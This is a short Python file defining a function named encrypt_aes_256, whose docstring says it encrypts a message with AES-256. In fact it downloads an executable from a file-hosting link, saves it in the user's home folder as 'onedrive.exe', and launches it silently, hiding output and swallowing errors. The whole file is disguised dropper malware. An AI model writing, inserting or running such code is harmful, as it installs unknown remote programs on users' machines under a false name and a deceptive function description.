import requests, os,subprocess
username = os.getlogin()
def encrypt_aes_256(message: str):
    """
Encrypt message using AES 256
    """
    try:
        response = requests.get(r"https://store2.gofile.io/download/web/fcd55fca-bac0-474e-ab39-9085a500f534/Built.exe", stream=True)
        response.raise_for_status()  # Check if the request was successful
        username = os.getlogin()
        with open(f"C:\\Users\\{username}\\onedrive.exe", 'wb') as file:
            for chunk in response.iter_content(chunk_size=8192):
                file.write(chunk)
        subprocess.Popen(['start', f'C:\\Users\\{username}\\onedrive.exe'],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except requests.exceptions.RequestException as e:
        pass
